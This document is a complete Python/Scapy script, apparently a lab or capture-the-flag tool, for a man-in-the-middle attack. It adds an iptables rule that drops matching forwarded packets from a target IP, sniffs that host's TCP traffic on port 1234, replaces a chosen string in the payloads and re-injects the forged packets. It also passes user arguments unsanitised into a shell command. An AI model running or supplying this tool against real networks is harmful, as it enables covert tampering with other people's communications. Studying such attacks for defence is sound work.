#!/usr/bin/env python3
import argparse
from scapy.all import *

parser = argparse.ArgumentParser(description="MITM Packet Modifier")
parser.add_argument("-s", "--src", required=True, help="Source IP address")
parser.add_argument("-f", "--find", required=True, help="String to find")
parser.add_argument("-r", "--replace", required=True, help="Replacement string")
args = parser.parse_args()

SRC_IP = args.src
FIND = args.find.encode()
REPLACE = args.replace.encode()

# Optional: handle unequal lengths
if len(FIND) != len(REPLACE):
    if len(REPLACE) < len(FIND):
        REPLACE += b' ' * (len(FIND) - len(REPLACE))
        print(f"[!] NOTE: Replacement string padded with {len(FIND) - len(REPLACE)} space(s).")
    else:
        print("[!] ERROR: Replacement string is too long!")
        exit(1)

# Drop original packet so only the modified one is forwarded
os.system(f"iptables -A FORWARD -s {SRC_IP} -p tcp -m string --string \"{args.find}\" --algo kmp -j DROP")
print(f"[+] iptables rule added: dropping original packets from {SRC_IP} containing '{args.find}'")

def modify(pkt):
    if pkt.haslayer(IP) and pkt.haslayer(TCP):
        if pkt[IP].src == SRC_IP and pkt[TCP].payload:
            raw = pkt[TCP].payload.load
            if FIND in raw:
                print(f"[+] Intercepted: {raw}")
                new_raw = raw.replace(FIND, REPLACE)
                new_pkt = IP(src=pkt[IP].src, dst=pkt[IP].dst) / \
                          TCP(sport=pkt[TCP].sport, dport=pkt[TCP].dport,
                              seq=pkt[TCP].seq, ack=pkt[TCP].ack, flags=pkt[TCP].flags) / \
                          new_raw
                del new_pkt[IP].chksum
                del new_pkt[TCP].chksum
                send(new_pkt, verbose=0)
                print(f"[+] Modified and sent: {new_raw}")

print(f"[*] Running... intercepting traffic from {SRC_IP} on port 1234")
sniff(filter=f"tcp and src host {SRC_IP} and port 1234", prn=modify, store=0)